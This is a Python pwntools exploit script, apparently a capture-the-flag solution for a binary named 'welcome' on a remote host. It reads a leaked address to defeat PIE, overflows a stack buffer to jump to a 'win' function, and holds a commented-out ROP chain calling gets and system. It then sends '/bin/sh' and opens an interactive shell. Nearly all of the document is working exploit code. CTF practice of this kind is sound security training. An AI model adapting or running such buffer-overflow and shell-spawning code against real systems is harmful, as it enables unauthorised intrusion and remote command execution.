#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 45.77.44.53 --port 1024 ./welcome
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./welcome')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '45.77.44.53'
port = int(args.PORT or 1024)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
win = 0x0000558845f5b90b
welcome_base = 0x942
win_base= 0x90b
pop_rdi = 0x0000000000000a83
flag = 0x202060
plt_gets=0x770
plt_system=0x740
exe = ELF("welcome")
io.recvuntil("welcome(): ")

leak = int(io.recvline()[:-1],16) - welcome_base
print hex(leak)

p = 'ARA2021\x00'.ljust(0xff,"a")
p+='a'*9
p+=p64(leak + win_base)
p+=p64(leak + win_base)
# p+=p64(leak + pop_rdi)
# p+=p64(leak + flag)
# p+=p64(leak + plt_gets)
# p+=p64(leak + pop_rdi)
# p+=p64(leak + flag)
# p+=p64(leak + plt_system)

io.sendline(p)

p="/bin/sh\x00"
io.sendline(p)
io.interactive()
